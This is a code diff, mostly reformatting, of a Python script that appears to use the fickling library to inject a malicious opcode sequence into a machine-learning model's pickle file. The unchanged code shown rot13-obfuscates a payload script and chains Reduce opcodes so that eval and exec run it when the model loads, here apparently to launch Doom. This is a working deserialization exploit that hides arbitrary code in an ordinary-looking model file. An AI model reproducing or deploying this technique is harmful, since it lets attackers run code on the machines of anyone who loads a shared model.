@@ -111,7 +111,9 @@ def hidden_unicode(uni: bytes) -> list[p.Opcode]:
 
 rot13 = {97 + i: 97 + (i + 13) % 26 for i in range(26)}
 payload_body = open("payload.py").read().translate(rot13)
-rot13_payload = '"""' + payload_body + '""".translate({97+i:97+(i+13)%26 for i in range(26)})'
+rot13_payload = (
+    '"""' + payload_body + '""".translate({97+i:97+(i+13)%26 for i in range(26)})'
+)
 
 exploit = [
     # from torch._utils import _rebuild_tensor as orig_rebuild_tensor
@@ -142,14 +144,14 @@ exploit = [
     # un-rot13 payload source
     p.Unicode(rot13_payload.encode()),
     p.TupleOne(),
-    p.Reduce(), # eval(<rot13_payload>.translate(rot13))
+    p.Reduce(),  # eval(<rot13_payload>.translate(rot13))
     # stack: [eval, plaintext_payload]
     p.TupleOne(),
     p.Reduce(),  # define payload fn, `eval(exec(payload) or payload)`
     get_doom_binbytes(),
     p.TupleOne(),
     p.Reduce(),  # payload(doom_bytes)
-    p.Pop(), #p.Pop(),
+    p.Pop(),  # p.Pop(),
 ]
 
 
@@ -207,7 +209,8 @@ exploit = [
 #         break
 
 preliminary_result = postprocess(Pickled(vae_pickle[:2] + exploit + vae_pickle[2:]))
-
+# preliminary_result = postprocess(Pickled(vae_pickle[:-1] + exploit + [p.Stop()]))
+# preliminary_result = vae_pickle
 
 # we fucked with data and position, so have fickling re-parse the pickle
 result = Pickled.load(preliminary_result.dumps())
